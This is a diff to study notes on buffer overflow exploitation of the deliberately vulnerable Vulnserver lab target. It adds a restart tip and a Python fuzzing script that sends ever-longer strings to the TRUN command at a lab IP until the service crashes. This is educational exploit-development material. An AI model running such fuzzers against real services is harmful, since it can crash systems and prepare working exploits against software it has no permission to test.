@@ -221,6 +221,8 @@ s_string_variable("0");
 
 - NOTE: The program has crashed, so we will need to restart the `Vuln Server` and attach it again to the `Immunity Debugger`
 
+    - **It's better to close everything and start from 0 to avoid errors** 
+
 ---
 
 ### Fuzzing
@@ -230,6 +232,29 @@ s_string_variable("0");
     - We will try to send a bunch of characters at a specific command and try to break it... 
     - The difference is that we already know which command is vulnerable (`TRUN`) 
 
+- It's time to present...the python script for Fuzzing ahhhhhh (monk chant):
+
+```python
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+buffer = "A" * 100
+
+while True:
+        try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('192.168.1.100', 9999))
+                
+                s.send(('TRUN /.:/' + buffer))
+                s.close()
+                sleep(1)
+                buffer = buffer + "A"*100
+        
+        except:
+                print "Fuzzing crashed at %s bytes" % str(len(buffer))
+                sys.exit()
+```
 
 
 
